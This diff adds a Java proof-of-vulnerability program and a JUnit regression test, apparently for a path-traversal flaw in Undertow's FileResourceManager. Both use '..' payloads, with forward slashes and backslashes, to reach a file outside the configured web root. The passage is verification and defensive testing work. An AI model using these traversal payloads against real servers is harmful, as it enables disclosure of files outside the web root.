+import io.undertow.server.handlers.resource.FileResourceManager;
+import io.undertow.server.handlers.resource.Resource;
+
+import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
+
+/**
+ * Proof-of-vulnerability for CWE-022 (Path Traversal) in
+ * io.undertow.server.handlers.resource.FileResourceManager#getResource(String).
+ *
+ * Root cause (shared sink for every trace in the alert):
+ *   core/src/main/java/io/undertow/server/handlers/resource/FileResourceManager.java
+ *   getResource(String p) builds `new File(base, path)` (line 89) from a
+ *   caller-supplied, effectively untrusted, relative path and returns a
+ *   Resource for it (line 90) WITHOUT ever verifying that the resolved
+ *   File's canonical path is still contained within `base`. The only
+ *   post-resolution check present is a case-sensitivity check
+ *   (`file.getCanonicalFile().getName().equals(file.getName())`), which
+ *   compares only the last path segment and does nothing to stop ".."
+ *   segments from walking the resolution outside of the configured
+ *   resource root.
+ *
+ * This harness calls the real, unmodified FileResourceManager API (no
+ * fakes/mocks) with a classic ".." traversal payload and confirms that the
+ * manager happily resolves and returns a Resource that points at a file
+ * living OUTSIDE the configured base directory - i.e. a directory-escape /
+ * arbitrary file disclosure primitive reachable by any caller that can
+ * influence the resource path (ResourceHandler, DefaultServlet.doGet via
+ * getPath(req) at DefaultServlet.java:129/134, and
+ * ServletContextImpl#getRealPath via CanonicalPathUtils.canonicalize at
+ * ServletContextImpl.java:313/316, all of which funnel into this exact
+ * sink).
+ *
+ * On the vulnerable code this program prints VULNERABLE and exits 0.
+ * On a correctly patched FileResourceManager (one that rejects/contains
+ * the resolution to `base`) the escaping resource will no longer be
+ * returned, this program prints SAFE and exits 1.
+ */
+public class PovPathTraversal {
+
+    public static void main(String[] args) throws Exception {
+        // Layout:
+        //   <tmp>/webroot/            <- configured FileResourceManager base ("safe" web root)
+        //   <tmp>/secret.txt          <- sensitive file OUTSIDE the web root
+        File tmp = new File(System.getProperty("java.io.tmpdir"), "undertow-pov-" + System.nanoTime());
+        File webroot = new File(tmp, "webroot");
+        if (!webroot.mkdirs()) {
+            throw new IOException("failed to create webroot dir " + webroot);
+        }
+        File secret = new File(tmp, "secret.txt");
+        try (FileWriter fw = new FileWriter(secret)) {
+            fw.write("TOP-SECRET-OUTSIDE-WEBROOT");
+        }
+
+        String secretCanonical = secret.getCanonicalPath();
+        System.out.println("[pov] webroot        = " + webroot.getCanonicalPath());
+        System.out.println("[pov] secret file     = " + secretCanonical);
+
+        FileResourceManager manager = new FileResourceManager(webroot, 1024);
+
+        // Classic parent-directory traversal payload. This is the same
+        // resolution path (FileResourceManager.getResource -> new File(base,
+        // path) -> return Resource, lines 80/89/90) that every trace in the
+        // alert converges on: the direct call (trace 1), the
+        // ServletContextImpl#getRealPath -> CanonicalPathUtils.canonicalize
+        // path (trace 2, which fails to strip ".." reached via
+        // backslash-delimited segments on Windows), and the
+        // DefaultServlet#doGet -> getPath(req) path (traces 3 & 4, which
+        // pass the raw servlet/path-info straight into getResource with no
+        // canonicalization at all).
+        String payload = "/../" + secret.getName();
+
+        Resource resource = manager.getResource(payload);
+
+        if (resource == null) {
+            System.out.println("SAFE: getResource(\"" + payload + "\") returned null (traversal blocked)");
+            System.exit(1);
+        }
+
+        File resolved = resource.getFile();
+        String resolvedCanonical = resolved.getCanonicalPath();
+        System.out.println("[pov] resolved file   = " + resolvedCanonical);
+
+        String webrootCanonical = webroot.getCanonicalPath();
+        boolean escapedBase = !resolvedCanonical.startsWith(webrootCanonical + File.separator)
+                && !resolvedCanonical.equals(webrootCanonical);
+        boolean isSecretFile = resolvedCanonical.equals(secretCanonical);
+
+        if (escapedBase && isSecretFile) {
+            System.out.println("VULNERABLE: FileResourceManager.getResource(\"" + payload
+                    + "\") escaped the configured base directory and returned the file outside webroot: "
+                    + resolvedCanonical);
+            System.exit(0);
+        } else {
+            System.out.println("SAFE: resolved resource stayed within base directory");
+            System.exit(1);
+        }
+    }
+}

+import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
+
+import org.junit.After;
+import org.junit.Assert;
+import org.junit.Before;
+import org.junit.Test;

+/**
+ * Regression test for path traversal escapes out of the configured base directory
+ * (CWE-022). Verifies that {@link FileResourceManager#getResource(String)} refuses
+ * to return resources whose canonical path falls outside of the configured base,
+ * regardless of how the ".." segments are delimited.
+ */
+public class FileResourceManagerTestCase {
+
+    private File root;
+    private File webroot;
+    private File secret;
+
+    @Before
+    public void setup() throws IOException {
+        root = new File(System.getProperty("java.io.tmpdir"), "undertow-frm-test-" + System.nanoTime());
+        webroot = new File(root, "webroot");
+        webroot.mkdirs();
+        secret = new File(root, "secret.txt");
+        writeFile(secret, "top secret");
+        File inRoot = new File(webroot, "hello.txt");
+        writeFile(inRoot, "hello");
+    }
+
+    private static void writeFile(File file, String contents) throws IOException {
+        FileWriter writer = new FileWriter(file);
+        try {
+            writer.write(contents);
+        } finally {
+            writer.close();
+        }
+    }
+
+    @After
+    public void cleanup() {
+        delete(root);
+    }
+
+    private static void delete(File file) {
+        File[] children = file.listFiles();
+        if (children != null) {
+            for (File child : children) {
+                delete(child);
+            }
+        }
+        file.delete();
+    }
+
+    @Test
+    public void testResourceWithinBaseIsServed() {
+        FileResourceManager manager = new FileResourceManager(webroot, 1024);
+        Resource resource = manager.getResource("/hello.txt");
+        Assert.assertNotNull(resource);
+    }
+
+    @Test
+    public void testForwardSlashTraversalIsBlocked() {
+        FileResourceManager manager = new FileResourceManager(webroot, 1024);
+        Assert.assertNull(manager.getResource("/../secret.txt"));
+        Assert.assertNull(manager.getResource("/a/../../secret.txt"));
+        Assert.assertNull(manager.getResource("../secret.txt"));
+    }
+
+    @Test
+    public void testBackslashTraversalIsBlocked() {
+        FileResourceManager manager = new FileResourceManager(webroot, 1024);
+        // On platforms where '\' is not a path separator this will not even resolve to a
+        // distinct file, but the containment check must never allow it through regardless
+        // of platform-specific java.io.File separator handling.
+        Assert.assertNull(manager.getResource("..\\..\\secret.txt"));
+        Assert.assertNull(manager.getResource("/a\\..\\..\\secret.txt"));
+        Assert.assertNull(manager.getResource("/a/..\\../secret.txt"));
+    }
